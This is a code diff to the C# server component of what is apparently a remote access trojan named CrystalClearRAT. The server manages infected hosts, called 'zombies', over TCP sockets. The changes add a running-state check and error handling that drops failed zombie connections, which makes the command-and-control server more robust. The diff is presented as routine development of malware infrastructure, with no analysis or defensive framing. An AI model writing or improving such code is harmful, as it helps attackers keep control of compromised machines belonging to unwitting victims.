@@ -20,8 +20,11 @@ namespace CrystalClearRAT.Web
 
         public static Socket ServerSocket { get; private set; }
 
+
         public static void Start(int port)
         {
+            if (IsRunning) throw new InvalidOperationException("The server is already running.");
+
             ServerSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
             ServerSocket.Bind(new IPEndPoint(IPAddress.Any, port));
             ServerSocket.Listen(0);
@@ -33,15 +36,28 @@ namespace CrystalClearRAT.Web
         {
             byte[] dataLength = BitConverter.GetBytes(data.Length);
 
-
-            zombie.Socket.BeginSend(dataLength, 0, dataLength.Length, 0, new AsyncCallback(SendCallback), new StateObject(zombie, data));
+            try
+            {
+                zombie.Socket.BeginSend(dataLength, 0, dataLength.Length, 0, new AsyncCallback(SendCallback), new StateObject(zombie, data));
+            }
+            catch (SocketException)
+            {
+                zombie.Destroy();
+            }
         }
 
         private static void SendCallback(IAsyncResult ar)
         {
             StateObject state = (StateObject)ar.AsyncState;
-            state.Zombie.Socket.EndSend(ar);
-            state.Zombie.Socket.Send(state.Buffer);
+            try
+            {
+                state.Zombie.Socket.EndSend(ar);
+                state.Zombie.Socket.Send(state.Buffer);
+            }
+            catch
+            {
+                state.Zombie.Destroy();
+            }
 
         }
 
@@ -85,7 +101,6 @@ namespace CrystalClearRAT.Web
 
         private static void ReceiveCallback(IAsyncResult ar)
         {
-            // TODO: ERROR CONTROL AND OPERATION TIMEOUT.
 
             StateObject state = (StateObject)ar.AsyncState;
 
